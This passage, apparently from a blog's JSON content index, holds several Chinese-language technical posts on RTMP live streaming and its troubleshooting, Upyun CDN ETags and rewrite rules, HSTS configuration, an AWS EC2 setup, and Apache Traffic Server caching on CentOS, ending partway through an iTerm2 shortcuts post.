pts=100, ndiff=0, diff=16/23, size=475, AAC(44KHz,16bit,Stereo,Raw) [2017-06-22 16:37:43.32][2742] Video packet id=23/35.3/28.3, type=Video, dts=117, pts=183, ndiff=0, diff=17/33, size=593, H.264(Nalu,P/B) [2017-06-22 16:37:43.32][2742] Audio packet id=24/33.8/29.6, type=Audio, dts=123, pts=123, ndiff=0, diff=6/23, size=477, AAC(44KHz,16bit,Stereo,Raw)其中我们主要看类似下面的信息 [2017-06-22 16:37:43.32][2742] Audio packet id=24/33.8/29.6, type=Audio, dts=123, pts=123, ndiff=0, diff=6/23, size=477, AAC(44KHz,16bit,Stereo,Raw)如果说出现类似这样的现象，则推流端要检查下编码器是否有问题","categories":[],"tags":[{"name":"直播","slug":"直播","permalink":"https://awen.me/tags/%E7%9B%B4%E6%92%AD/"}]},{"title":"又拍云缩略图etag值与下载后的文件md5值不一致","slug":"又拍云缩略图etag值与下载后的文件md5值不一致","date":"2017-06-22T08:23:58.000Z","updated":"2021-02-26T06:05:29.320Z","comments":true,"path":"posts/2023096546.html","link":"","permalink":"https://awen.me/posts/2023096546.html","excerpt":"在又拍云上传的文件，原文件 md5 值与响应头中的 etag 值一致，比如 $curl -I https://awen.me/uploads/IMG_4224.JPG -v","text":"在又拍云上传的文件，原文件 md5 值与响应头中的 etag 值一致，比如 $curl -I https://awen.me/uploads/IMG_4224.JPG -v 得到的 etag 值是 &lt; Cache-Control: public, must-revalidate, max-age=1036800 Cache-Control: public, must-revalidate, max-age=1036800 &lt; ETag: &quot;955B00347688C48932AF1D746D196002&quot; ETag: &quot;955B00347688C48932AF1D746D196002&quot; &lt; Last-Modified: Thu, 22 Jun 2017 02:54:44 GMT Last-Modified: Thu, 22 Jun 2017 02:54:44 GMT &lt; X-Oss-Request-Id: 594B54428881834B04B7662E X-Oss-Request-Id: 594B54428881834B04B7662E &lt; X-Oss-Hash-Crc64ecma: 16915821891617572766 X-Oss-Hash-Crc64ecma: 16915821891617572766 &lt; Content-Md5: lVsANHaIxIkyrx10bRlgAg== Content-Md5: lVsANHaIxIkyrx10bRlgAg== &lt; Accept-Ranges: bytes Accept-Ranges: bytes下载后得到的结果与原图是一样的 ➜ Downloads wget -c https://file.awen.me/blog/2017-06-22-025442.jpg!awen) --2017-06-22 16:30:51-- https://file.awen.me/blog/2017-06-22-025442.jpg!awen) Connecting to 127.0.0.1:1087... connected. Proxy request sent, awaiting response... 200 OK Length: 142041 (139K) [image/jpeg] Saving to: ‘2017-06-22-025442.jpg!awen)’ 2017-06-22-025442.jpg!awen) 100%[========================================================================================&gt;] 138.71K --.-KB/s in 0.1s 2017-06-22 16:30:52 (1.06 MB/s) - ‘2017-06-22-025442.jpg!awen)’ saved [142041/142041] ➜ Downloads md5 2017-06-22-025442.jpg!awen) MD5 (2017-06-22-025442.jpg!awen) = 955b00347688c48932af1d746d196002但是我们继续看下，请求缩略图 ➜ Downloads curl -I https://file.awen.me/blog/2017-06-22-025442.jpg!awen)\\!500 -v * Trying 127.0.0.1... * TCP_NODELAY set * Connected to 127.0.0.1 (127.0.0.1) port 1087 (#0) * Establish HTTP proxy tunnel to file.awen.me:443 &gt; CONNECT file.awen.me:443 HTTP/1.1 &gt; Host: file.awen.me:443 &gt; User-Agent: curl/7.51.0 &gt; Proxy-Connection: Keep-Alive &gt; &lt; HTTP/1.1 200 Connection established HTTP/1.1 200 Connection established &lt; * Proxy replied OK to CONNECT request * TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 * Server certificate: file.awen.me * Server certificate: Let&apos;s Encrypt Authority X3 * Server certificate: DST Root CA X3 &gt; HEAD /blog/2017-06-22-025442.jpg!awen)!500 HTTP/1.1 &gt; Host: file.awen.me &gt; User-Agent: curl/7.51.0 &gt; Accept: */* &gt; &lt; HTTP/1.1 200 OK HTTP/1.1 200 OK &lt; Server: marco/1.4 Server: marco/1.4 &lt; Date: Thu, 22 Jun 2017 08:32:10 GMT Date: Thu, 22 Jun 2017 08:32:10 GMT &lt; Content-Type: image/png Content-Type: image/png &lt; Content-Length: 175029 Content-Length: 175029 &lt; Connection: keep-alive Connection: keep-alive &lt; X-Source: C/200, G/200 X-Source: C/200, G/200 &lt; Last-Modified: Thu, 22 Jun 2017 02:54:44 GMT Last-Modified: Thu, 22 Jun 2017 02:54:44 GMT &lt; ETag: &quot;b8beb4fa909148b01e2ba893ee569735&quot; ETag: &quot;b8beb4fa909148b01e2ba893ee569735&quot; &lt; Accept-Ranges: bytes Accept-Ranges: bytes &lt; Expires: Tue, 04 Jul 2017 08:32:10 GMT Expires: Tue, 04 Jul 2017 08:32:10 GMT &lt; Cache-Control: public, must-revalidate, max-age=1036800 Cache-Control: public, must-revalidate, max-age=1036800 &lt; X-Request-Id: a95f28964d2c3e6bafbbf482f89c721b X-Request-Id: a95f28964d2c3e6bafbbf482f89c721b &lt; Via: S.pcw-cn-hkg-167, T.89163.M.1, V.pcw-cn-hkg-163, M.pcw-cn-hkg-163 Via: S.pcw-cn-hkg-167, T.89163.M.1, V.pcw-cn-hkg-163, M.pcw-cn-hkg-163 &lt; Strict-Transport-Security: max-age=15552000; includeSubDomains; preload Strict-Transport-Security: max-age=15552000; includeSubDomains; preload &lt; * Curl_http_done: called premature == 0 * Connection #0 to host 127.0.0.1 left intactetag 值是 b8beb4fa909148b01e2ba893ee569735，然后我们下载后看下 md5值 ➜ Downloads md5 2017-06-22-025442.jpg!awen)\\!500 MD5 (2017-06-22-025442.jpg!awen)!500) = 887ea813a8397e783ff396aedecafaf7不一致，原因是因为又拍云的缩略图是动态生成的，在动态制作的国产中增加了很多参数导致 md5值发生了变化。","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"直播录制和故障排查","slug":"直播录制和故障排查","date":"2017-06-22T02:48:26.000Z","updated":"2021-02-26T06:05:29.348Z","comments":true,"path":"posts/925507050.html","link":"","permalink":"https://awen.me/posts/925507050.html","excerpt":"大家好，本文档主要是分享下怎么进行直播录制和问题排查思路 直播分为推流和拉流。推流是从本地通过推流工具将音视频推到直播服务器，然后客户端通过拉流地址去获取流。","text":"大家好，本文档主要是分享下怎么进行直播录制和问题排查思路 直播分为推流和拉流。推流是从本地通过推流工具将音视频推到直播服务器，然后客户端通过拉流地址去获取流。 推流软件目前主流的直播推流软件是使用开源的 OBS，它支持各个 PC 端平台，比如 Windows linux mac系统等，我们要获取直播软件，需要去它的官网下载 官网：https://obsproject.com/ 下载对应平台的程序包后，我们要进行安装，Windows 的安装直接点击下一步下一步就可以，不过可能需要去微软官网下载几个包进行安装，注意要下载32位的安装包。这个在安装过程会有弹出对话框提示你的，注意看下提示。安装完成后，我们打开 OBS 在来源中我们点击右键选择对应的来源，比如本地音视频或者桌面、摄像头等等，这个需要自己一个一个去研究下了，我这里以推一个本地的 MP4文件为例来进行讲解 我们右键添加–媒体源，输入媒体源的名称，我这里默认点击确定 选择本地的文件，然后点击确定 这样视频就添加进来了，在主程序可以看到预览，但是会有一大块是黑色部分，我们调整下 选择刚才添加的媒体源右键–变换–拉伸到屏幕 然后在观察下变化 设置推流地址点击主程序的设置 选择串流—串流类型选择自定义流媒体服务器，在 URL 中输入你的推流地址和接入点和流密钥，然后点击确定 推流地址 接入点 流密钥 这三个参数需要自己在又拍云的后台设置并获取，具体如何获取可以参考这个视频教程 推流地址比如我这边是test.v0.v5linux.com 接入点是 live 流名是lol 那么 rtmp 格式的流名就是:rtmp://test.v0.v5linux.com/live/lol 拉流可以通过拉流播放进行拉流，又拍云后台配置完模式是支持 rmtp的，当然你也可以开启 HTTP-FLV 和 HTTP-HLS 可以安装 vlc 播放器，打开媒体 选择网络，然后输入拉流地址 比如我的拉流域名是test.b0.v5linux.com。那么我上面推流的接入点是 live。流名是 lol，那么播放地址如下 rtmp: rtmp//test.b0.v5linux.com/live/lolhttp-flv: http://test.b0.v5linux.com/live/lol.flvm3u8: http://test.b0.v5linux.com/live/lol.m3u8 播放效果 如何判断推流卡还是播放（拉流）卡1.推流排查 推流端应当有一个良好的网络环境，否则推流极容易失败，推流是基于 RTMP 协议的。RMTP协议要经过一系列的，RTMP如何建立连接的，可以参考这篇文章 如果这中间出现了异常，肯定是客户端的问题。当然 OBS 主界面的一些参数也可以辅助我们判断推流端是否卡，注意下图红色圈过的地方有: 丢帧，0表示正常，稍微有一点也没有关系，如果这个值特别大，一定是本地上行网络不好。 CPU:如果 CPU 使用率特别高，也会导致卡顿 kb/s：码率，如果码率特别低也是会造成无法推流或卡顿的现象。 此外，如果出现重新连接，也是本地网络不好 另外，你也可以 ping 下推流地址看看 ping 值是否过高，是否丢包，将这个信息记录下来 上面的是正常的，没有问题，如果出现这样的情况，首先判断是不是本地网络问题然后可以通过 trzceroute 或者 Windows 的 tracert 命令进行判断是不是路由出现了问题，比如这种的，一直到程序运行结束都没有到达目标网络就可能是有问题的 另外也可以用mtr 去看下中间链路是不是丢包 $ mtr test.v0.v5linux.com 比如这中间的 ip loss%值 是不是很大 上面这个方法同样适用于拉流，当然这个需要一些网络和系统功底的才能做。如果你不懂，可以下载https://www.ipip.net/download.html#ip_trace basetrace 这个软件，图形化的界面，非常好用。输入域名或 ip，选择 dns 进行测试。 2.拉流排查 上面说了如何使用 vlc 进行播放，但是 vlc 播放花屏、卡住等现象，我们不能进行分析，我们可以通过如下方法进行分析 打开http://ossrs.net/srs.release/trunk/research/players/srs_player.html填写你的拉流地址 如果出现下面的情况，请检查浏览器是否按照 flash 播放器 比如 chrome 要在内容中运行 flash 如果出现黑屏，并且卡顿的现象 可以调整缓冲区大小 和最大缓冲区 另外卡顿多少次，也可以在播放器下方看到 @B 三个值分别表示缓存大小/缓存区时间/最大缓存区时间单位是秒 @F * @E 卡顿次数，卡顿次数较多，表示网络质量可能不怎么好 @F 实时帧率 @B 实时视频+音频码率 类似这样的就是正常的 对于播放卡，我们可以首先判断下本地网络是否正常，可以访问http://pubstatic.b0.upaiyun.com/cdn-stream-test.html 看看，这个最好是当时卡顿就截图保存，可以发又拍云的技术分析 如果显示速度理想，可以参考推流的说明 ping 和 traceroute/tracert 或者用 besttrace 去测下截图一并发给又拍云的技术排查 我们都需要哪些信息好了，我们可以看下，都需要哪些信息 推流和拉流客户端信息，推流卡顿的时间点，比如运营商信息，参考上面的文档内容提供 ping traceroute/tracert截图 路由信息、DNS信息 OBS 显示的丢帧、CPU 占比、码率等 视频教程可以参考又拍云官网的视频教程，针对 PC 端 移动端（Android iOS）都有介绍http://docs.upyun.com/faq/#_5","categories":[],"tags":[{"name":"直播","slug":"直播","permalink":"https://awen.me/tags/%E7%9B%B4%E6%92%AD/"}]},{"title":"ffmpeg录制直播流","slug":"ffmpeg录制直播流","date":"2017-06-21T08:21:38.000Z","updated":"2021-02-26T06:05:29.273Z","comments":true,"path":"posts/485165459.html","link":"","permalink":"https://awen.me/posts/485165459.html","excerpt":"录制$ffmpeg -i rtmp://test.b0.v5linux.com/live/lol -c copy dump.flv","text":"录制$ffmpeg -i rtmp://test.b0.v5linux.com/live/lol -c copy dump.flv 播放$ffplay dump.flv 参考资料http://blog.csdn.net/leixiaohua1020/article/details/12029543","categories":[],"tags":[{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://awen.me/tags/ffmpeg/"}]},{"title":"聊一聊 HSTS","slug":"聊一聊-HSTS","date":"2017-06-21T01:46:20.000Z","updated":"2021-02-26T06:05:29.353Z","comments":true,"path":"posts/1787418755.html","link":"","permalink":"https://awen.me/posts/1787418755.html","excerpt":"为什么要开启 HSTS在网站开启全站 HTTPS 后，如果用户端从浏览器手动输入的是 HTTP 地址，或者从其它地方点击了网站的 HTTP 链接，那么浏览器会依赖于服务端 301/302 跳转才能使用 HTTPS 服务。而第一次的 HTTP 请求就有可能被劫持，导致请求无法到达服务器，从而构成 HTTPS 降级劫持。","text":"为什么要开启 HSTS在网站开启全站 HTTPS 后，如果用户端从浏览器手动输入的是 HTTP 地址，或者从其它地方点击了网站的 HTTP 链接，那么浏览器会依赖于服务端 301/302 跳转才能使用 HTTPS 服务。而第一次的 HTTP 请求就有可能被劫持，导致请求无法到达服务器，从而构成 HTTPS 降级劫持。 什么是 HSTSHSTS（HTTP Strict Transport Security，HTTP 严格传输安全)，是一套由互联网工程任务组发布的互联网安全策略机制。网站可以通过配置 HSTS，来强制浏览器使用 HTTPS 与网站通信，保障网站更加安全。 HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。服务器开启HSTS的方法是，当客户端通过HTTPS发出请求时，在服务器返回的超文本传输协议响应头中包含Strict-Transport-Security字段。非加密传输时设置的HSTS字段无效。比如，https://example.com/的响应头含有Strict-Transport-Security: max-age=31536000; includeSubDomains。这意味着两点：在接下来的一年（即31536000秒）中，浏览器只要向example.com或其子域名发送HTTP请求时，必须采用HTTPS来发起连接。比如，用户点击超链接或在地址栏输入 http://www.example.com/ ，浏览器应当自动将 http 转写成 https，然后直接向 https://www.example.com/ 发送请求。在接下来的一年中，如果 example.com 服务器发送的TLS证书无效，用户不能忽略浏览器警告继续访问网站。 nginx 配置在 server 段中添加响应头 add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains; preload&quot;; max-age，单位是秒，用来告诉浏览器在指定时间内，这个网站必须通过 HTTPS 协议来访问。也就是对于这个网站的 HTTP 地址，浏览器需要先在本地替换为 HTTPS 之后再发送请求。 includeSubDomains，可选参数，如果指定这个参数，表明这个网站所有子域名也必须通过 HTTPS 协议来访问。 preload，可选参数HSTS 这个响应头只能用于 HTTPS 响应；网站必须使用默认的 443 端口；必须使用域名，不能是 IP。而且启用 HSTS 之后，一旦网站证书错误，用户无法选择忽略。 浏览器请求后响应头中会显示 strict-transport-security:max-age=31536000 关于 HSTS 这部分的内容，可以扩展阅读下这篇文章 又拍云开启 HSTS1.找到对应的服务，切换到 HTTPS，可以看到 HSTS 的配置 2.点击管理，然后添加一条规则 3.然后开启 HSTS 选择要开启的域名 点击启用 HSTS 按钮 配置缓存，HSTS 默认要求必须配置时间为180天 开启子域名名，那么你的子域名都必须配置 HTTPS 预加载，这个要慎重，具体阅读下面的内容 注意，下面这段摘自https://imququ.com/post/sth-about-switch-to-https.html HSTS 可以很好的解决 HTTPS 降级攻击，但是对于 HSTS 生效前的首次 HTTP 请求，依然无法避免被劫持。浏览器厂商们为了解决这个问题，提出了 HSTS Preload List 方案：内置一份可以定期更新的列表，对于列表中的域名，即使用户之前没有访问过，也会使用 HTTPS 协议。目前这个 Preload List 由 Google Chrome 维护，Chrome、Firefox、Safari、IE 11 和 Microsoft Edge 都在使用。如果要想把自己的域名加进这个列表，首先需要满足以下条件：拥有合法的证书（如果使用 SHA-1 证书，过期时间必须早于 2016 年）；将所有 HTTP 流量重定向到 HTTPS；确保所有子域名都启用了 HTTPS；输出 HSTS 响应头：max-age 不能低于 18 周（10886400 秒）；必须指定 includeSubdomains 参数；必须指定 preload 参数；即便满足了上述所有条件，也不一定能进入 HSTS Preload List，更多信息可以看这里。通过 Chrome 的 chrome://net-internals/#hsts 工具，可以查询某个网站是否在 Preload List 之中，还可以手动把某个域名加到本机 Preload List。对于 HSTS 以及 HSTS Preload List，我的建议是只要你不能确保永远提供 HTTPS 服务，就不要启用。因为一旦 HSTS 生效，你再想把网站重定向为 HTTP，之前的老用户会被无限重定向，唯一的办法是换新域名。 如果确定要开启，点击https://hstspreload.org 输入你的域名，勾选协议，注意看清楚哦，提交了就没有机会反悔了。 确认后，你就可以将你的域名提交给 HSTS 预加载列表了 提交成功后会给你返回成功的信息，不过你要保证你的配置比如是一直开启了，否则也会从列表中删除。 再次访问，查看浏览器响应头","categories":[],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://awen.me/tags/HTTPS/"}]},{"title":"又拍云 rewrite 规则的使用","slug":"又拍云-rewrite-规则的使用","date":"2017-06-20T14:07:43.000Z","updated":"2021-02-26T06:05:29.319Z","comments":true,"path":"posts/3051968981.html","link":"","permalink":"https://awen.me/posts/3051968981.html","excerpt":"又拍云提供了非常灵活的rewrite 配置，通过 rewrite，我们可以对存储或 CDN 内的资源做很多策略或限制等等。具体的可以参考文档:http://docs.upyun.com/cdn/rewrite/ 那么关于语法之类的，大家可以查看官网的文档，写的比较详细。我这里主要写下日常的一些常见的配置","text":"又拍云提供了非常灵活的rewrite 配置，通过 rewrite，我们可以对存储或 CDN 内的资源做很多策略或限制等等。具体的可以参考文档:http://docs.upyun.com/cdn/rewrite/ 那么关于语法之类的，大家可以查看官网的文档，写的比较详细。我这里主要写下日常的一些常见的配置 如何配置后台选择服务-找到你需要配置的服务，点击配置 然后选择高级功能 找到自定义 rewrite，点击后面的管理 然后选择开启 然后点击添加规则，所有的规则，都在这里写，写完之后勾选调试模式，然后保存 比如我这里有一个需求，我希望所有访问www.awen.me这个域名都跳转到awen.me（前提是你这2个域名都已经绑定在你配置 rewrite 规则的对应服务下） 那么我们可以这样写，这句表示，判断请求的 host 是否是 www.awen.me，通过 $EQ去判断$_HOST的值是否与www.awen.me相等。如果相同则执行后面的$REDIRECT 是重定向，意思是说把这个请求重定向到https://awen.me 去，301是重定向的 HTTP 状态码。 $WHEN($EQ($_HOST, &apos;www.awen.me&apos;))$REDIRECT(https://awen.me, 301) 因为这个 rewrite 是针对整个域名下所有的资源的，所有我们只需要填写 rewrite 规则，正则就不需要填了。 使用前必读：Rewrite 规则书写不当，可能会产生副作用，强烈建议您在开启调试模式后使用命令行工具 curl 对规则调试，查看 Rewrite 后的结果：curl -H “X-Upyun-Rewrite-Preview: true” http://your-domain/foo/bar.html -v关闭调试模式后 Rewrite 将正式生效！ 比如，我上面配置的是测试301调整是否正常，那么我们可以使用如下命令 curl -H &quot;X-Upyun-Rewrite-Preview: true&quot; https://www.awen.me -v 去测试是否跳转，如果成功后，则去后台关闭调试模式，就可以使用浏览器正常访问啦。 一些常见的 rewrite 案例可以参考又拍云官网的案例https://docs.upyun.com/cdn/rewrite/#_15 视频教程如果你是新手，推荐看下这个视频，会加深你对 rewrite 的理解","categories":[],"tags":[{"name":"rewrite","slug":"rewrite","permalink":"https://awen.me/tags/rewrite/"}]},{"title":"注册亚马逊使用免费12个月的服务器","slug":"注册亚马逊使用免费12个月的服务器","date":"2017-06-20T06:36:41.000Z","updated":"2021-02-26T06:05:29.345Z","comments":true,"path":"posts/3158107179.html","link":"","permalink":"https://awen.me/posts/3158107179.html","excerpt":"注册1.注册登录后台，注册后需要填写相关信息，然后信用卡（外币卡），然后会电话确认输入 4位 PIN码。注册后登陆后台","text":"注册1.注册登录后台，注册后需要填写相关信息，然后信用卡（外币卡），然后会电话确认输入 4位 PIN码。注册后登陆后台 创建Ec2然后要选基本的服务，其他的都是要付费的1.点击启动 ec2 2.选择快速创建 3.输入名称4.选择操作系统 4.基本账户免费的服务器申请配置为1 个核心 vCPU（高达 3.3 GHz），1 GiB 内存 RAM，8 GB 存储空间 5.创建密钥 6.创建实例 ssh 连接转到控制台，查看 ip 点击连接查看如何连接 第一眼没看懂，死活连不上，原来要先去安全组放行端口 然后ssh 指定下载的密钥连接，要切换到 root 就运行sudo su","categories":[],"tags":[{"name":"aws","slug":"aws","permalink":"https://awen.me/tags/aws/"}]},{"title":"Centos 搭建 Apache Trafficserver 缓存服务器","slug":"Centos-搭建-Apache-Trafficserver-缓存服务器","date":"2017-06-20T05:33:12.000Z","updated":"2021-02-26T06:05:29.242Z","comments":true,"path":"posts/699642880.html","link":"","permalink":"https://awen.me/posts/699642880.html","excerpt":"Centos 搭建 Apache Trafficserver 缓存服务器 常见的缓存服务器有squid、Varnish以及我们今天要讲的Apache Trafficeserver，本文将带你一起安装和配置缓存服务器实现对源站的资源进行加速，","text":"Centos 搭建 Apache Trafficserver 缓存服务器 常见的缓存服务器有squid、Varnish以及我们今天要讲的Apache Trafficeserver，本文将带你一起安装和配置缓存服务器实现对源站的资源进行加速， Trafficserver官网：http://trafficserver.apache.org/ 配置设备简介2台设备： 一台阿里云青岛服务器（源站 LNMP环境）一台深圳服务器（ATS） 安装ATS参见官网文档：https://docs.trafficserver.apache.org/en/latest/getting-started/index.en.html#installation 1.Centos安装ats wget https://dl.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-5.noarch.rpm sudo rpm -Uvh epel-release-7*.rpm yum -y install trafficserver2.配置文件在/etc/trafficserver目录下 cd /etc/trafficserver/ [root@iZ94dhr5x5iZ trafficserver]# ls body_factory hosting.config_1 logs_xml.config_1 proxy.pac_1 splitdns.config trafficserver-release cache.config icp.config parent.config records.config splitdns.config_1 update.config cache.config_1 icp.config_1 parent.config_1 records.config_1 ssl_multicert.config update.config_1 cluster.config ip_allow.config plugin.config remap.config ssl_multicert.config_1 vaddrs.config cluster.config_1 ip_allow.config_1 plugin.config_1 remap.config_1 stats.config.xml vaddrs.config_1 congestion.config log_hosts.config prefetch.config snapshots stats.config.xml_1 volume.config congestion.config_1 log_hosts.config_1 prefetch.config_1 socks.config storage.config volume.config_1 hosting.config logs_xml.config proxy.pac socks.config_1 storage.config_13.核心配置 /etc/trafficserver/record.config CONFIG proxy.config.http.server_ports STRING 80 #反向代理监听端口 CONFIG proxy.config.cache.ram_cache.size INT 512M #内存缓存4.回源配置 /etc/trafficserver/remap.config 访问的URL 回源地址 map http://www.v5linux.com/ http://www.fangwenjun.com/5.缓存目录及大小 /etc/trafficserver/storage.config /var/cache/trafficserver 256M #或使用裸盘 #/dev/sdb6.配置完后开启ATS /etc/init.d/trafficserver start chkconfig trafficserver on7.防火墙 iptables -A INPUT -p tcp --dport 80 -j ACCEPT7.访问网站 8.解决跨域问题 解决方案在源站nginx中加入响应头 然后再次查看响应头 其他参数record.config常用参数： #用于标识名称，Cluster模式下同一集群必须保持一致才能建立集群 traffic_line -s proxy.config.proxy_name -v test #配置cluster 模式 – 1 纯cluster 模式,有7层代理功能和集群配置同步 – 2 仅做配置管理 – 3 单机模式 traffic_line -s proxy.local.cluster.type -v 1 #自动配置线程数,多少个CPU配置多少个线程，可调整 CONFIG proxy.config.exec_thread.autoconfig INT 1 #开启 CONFIG proxy.config.exec_thread.autoconfig.scale FLOAT 1.500000 #CPU核数与TS线程数量比例 CONFIG proxy.config.exec_thread.limit INT 2 #每个核创建的线程数 CONFIG proxy.config.accept_threads INT 1 #运行单独线处理请求 #监听8080、80端口，8080 一般用于管理端口，80为服务端口 traffic_line -s proxy.config.http.server_ports -v 8080 80 #使用ssd做冷热缓存 LOCAL proxy.config.cache.ssd.storage STRING /dev/sdb #Cache内存大小,-1 为不限制，具体大小结合业务调整，内存命中越高磁盘IO越小 traffic_line -s proxy.config.cache.ram_cache.size -v 25769803776 #Cache内存淘汰算法，采用CLFUS，LRU 模式有问题 traffic_line -s proxy.config.cache.ram_cache.algorithm -v 1 #传输超时时间，默认900s，传输大文件容易触发超时，改成不限制 traffic_line -s proxy.config.http.transaction_active_timeout_in -v 0 #negative TTL 功能开启 traffic_line -s proxy.config.http.negative_caching_enabled -v 1 #忽略判断Accept头，默认会根据Accept头做多副本缓存 traffic_line -s proxy.config.http.cache.ignore_accept_mismatch -v 1 #忽略判断Accept-Language头，默认会根据Accept-Language头做多副本缓存 traffic_line -s proxy.config.http.cache.ignore_accept_language_mismatch -v 1 #忽略判断Accept-Charset头，默认会根据Accept-Charset头做多副本缓存 traffic_line -s proxy.config.http.cache.ignore_accept_charset_mismatch -v 1 #忽略client max-age traffic_line -s proxy.config.http.cache.ignore_client_cc_max_age -v 1 #忽略HTTP认证头，默认带Authentication是不做缓存的 traffic_line -s proxy.config.http.cache.ignore_authentication -v 1 #开启vary 功能 traffic_line -s proxy.config.http.cache.enable_default_vary_headers -v 1 #开启回源合并 traffic_line -s proxy.config.cache.enable_read_while_writer -v 1 #平均object 大小，结合业务配置 traffic_line -s proxy.config.cache.min_average_object_size -v 16384 #开启HTTP UI traffic_line -s proxy.config.http_ui_enabled -v 3隐藏版本号traffic_line -s proxy.config.http.response_server_str -v HFS/1.0. traffic_line -s proxy.config.http.response_via_str -v HFS然后reload配置文件 traffic_line -x缓存设置 设置cache.config dest_domain=www.fangwenjun.com suffix=gif revalidate=6h dest_domain=www.fangwenjun.com suffix=jpg revalidate=6h dest_domain=www.fangwenjun.com suffix=jpeg revalidate=6h dest_domain=www.fangwenjun.com suffix=png revalidate=6h dest_domain=www.fangwenjun.com suffix=bmp revalidate=6h dest_domain=www.fangwenjun.com suffix=swf revalidate=6h dest_domain=www.fangwenjun.com suffix=ico revalidate=6h dest_domain=www.fangwenjun.com suffix=js revalidate=6h dest_domain=www.fangwenjun.com suffix=css revalidate=6h dest_domain=www.fangwenjun.com revalidate=12h","categories":[],"tags":[{"name":"ats","slug":"ats","permalink":"https://awen.me/tags/ats/"}]},{"title":"rtmp协议","slug":"rtmp协议","date":"2017-06-20T05:32:02.000Z","updated":"2021-02-26T06:05:29.291Z","comments":true,"path":"posts/119606436.html","link":"","permalink":"https://awen.me/posts/119606436.html","excerpt":"本文描述了从打开一个RTMP流媒体到视音频数据开始播放的全过程。注意：RTMP中的逻辑结构 RTMP协议规定，播放一个流媒体有两个前提步骤： 第一步，建立一个网络连接（NetConnection）； 第二步，建立一个网络流（NetStream）。其中，网络连接代表服务器端应用程序和客户端之间基础的连通关系。网络流代表了发送多媒体数据的通道。服务器和客户端之间只能建立一个网络连接，但是基于该连接可以创建很多网络流。他们的关系如图所示：","text":"本文描述了从打开一个RTMP流媒体到视音频数据开始播放的全过程。注意：RTMP中的逻辑结构 RTMP协议规定，播放一个流媒体有两个前提步骤： 第一步，建立一个网络连接（NetConnection）； 第二步，建立一个网络流（NetStream）。其中，网络连接代表服务器端应用程序和客户端之间基础的连通关系。网络流代表了发送多媒体数据的通道。服务器和客户端之间只能建立一个网络连接，但是基于该连接可以创建很多网络流。他们的关系如图所示： 简要介绍播放一个RTMP协议的流媒体需要经过以下几个步骤：握手，建立连接，建立流，播放。RTMP连接都是以握手作为开始的。建立连接阶段用于建立客户端与服务器之间的“网络连接”；建立流阶段用于建立客户端与服务器之间的“网络流”；播放阶段用于传输视音频数据。 我们对照抓包看下，可以点击下载wireshark包 握手（HandShake）一个RTMP连接以握手开始，双方分别发送大小固定的三个数据块 a)握手开始于客户端发送C0、C1块。服务器收到C0或C1后发送S0和S1。b)当客户端收齐S0和S1后，开始发送C2。当服务器收齐C0和C1后，开始发送S2。c)当客户端和服务器分别收到S2和C2后，握手完成。 握手 建立网络连接（NetConnection）a) 客户端发送命令消息中的“连接”(connect)到服务器，请求与一个服务应用实例建立连接。b) 服务器接收到连接命令消息后，发送确认窗口大小(Window Acknowledgement Size)协议消息到客户端，同时连接到连接命令中提到的应用程序。c) 服务器发送设置带宽()协议消息到客户端。d) 客户端处理设置带宽协议消息后，发送确认窗口大小(Window Acknowledgement Size)协议消息到服务器端。e) 服务器发送用户控制消息中的“流开始”(Stream Begin)消息到客户端。f) 服务器发送命令消息中的“结果”(_result)，通知客户端连接的状态。 建立连接4建立网络流（NetStream）a)客户端发送命令消息中的“创建流”（createStream）命令到服务器端。b)服务器端接收到“创建流”命令后，发送命令消息中的“结果”(_result)，通知客户端流的状态。 建立流5 播放（Play）a)客户端发送命令消息中的“播放”（play）命令到服务器。b)接收到播放命令后，服务器发送设置块大小（ChunkSize）协议消息。c)服务器发送用户控制消息中的“streambegin”，告知客户端流ID。d)播放命令成功的话，服务器发送命令消息中的“响应状态” NetStream.Play.Start &amp; NetStream.Play.reset，告知客户端“播放”命令执行成功。e)在此之后服务器发送客户端要播放的音频和视频数据。 播放流","categories":[],"tags":[{"name":"rtmp","slug":"rtmp","permalink":"https://awen.me/tags/rtmp/"}]},{"title":"mac使用 item2","slug":"mac使用-item2","date":"2017-06-20T05:31:16.000Z","updated":"2021-02-26T06:05:29.277Z","comments":true,"path":"posts/3421214240.html","link":"","permalink":"https://awen.me/posts/3421214240.html","excerpt":"Iterm2 快捷键介绍Mac 原来自带的终端工具 Terminal 不好用是出了名的，虽然最近几个版本苹果稍微做了些优化，功能上，可用性方面增强不少，无奈有个更好用的 Iterm2 摆在那，基本上也就没有多少出场机会了 Iterm2，经常使用终端的同学肯定早就切换到这个东东上了，开源免费，和 zsh 搭配差不多已经取代 Terminal + bash 成了 Mac 上终端工具的标准配置。","text":"Iterm2 快捷键介绍Mac 原来自带的终端工具 Terminal 不好用是出了名的，虽然最近几个版本苹果稍微做了些优化，功能上，可用性方面增强不少，无奈有个更好用的 Iterm2 摆在那，基本上也就没有多少出场机会了 Iterm2，经常使用终端的同学肯定早就切换到这个东东上了，开源免费，和 zsh 搭配差不多已经取代 Terminal + bash 成了 Mac 上终端工具的标准配置。 Iterm2 的优点：兼容性好，远程服务器 vi 什么的低版本能很好兼容，Terminal 则会出问题支持 xterm-256 色，方便在终端中配置 vim/emacs 代码配色快捷键丰富，自带/自己定义都很方便分屏简单方便，可以根据自己需要同时搭配上 tmux，大屏用起来爽到爆官方文档 有非常详细的介绍，先来看看自带有哪些很实用的功能/快捷键 常用快捷键 ⌘ + 数字 在各 tab 标签直接来回切换 选择即复制 + 鼠标中键粘贴 ⌘ + f 所查找的内容会被自动复制 ⌘ + d 横着分屏 ⌘ + shift + d 竖着分屏 ⌘ + r = clear 而且只是换到新一屏，不会想 clear 一样创建一个空屏 ctrl + u 清空当前行，无论光标在什么位置 ⌘ + ; 自动列出输入过的命令 ⌘ + shift + h 会列出剪切板历史 ⌘ + 1 / 2 ｜左右 tab 之间来回切换｜ ⌘← / ⌘→ 到一行命令最左边/最右边 ，这个功能同 C+a / C+e ⌥← / ⌥→ 按单词前移/后移，相当与 C+f / C+b，其实这个功能在Iterm中已经预定义好了，⌥f / ⌥b｜ 当然除了这些可以自定义的也不能忘了 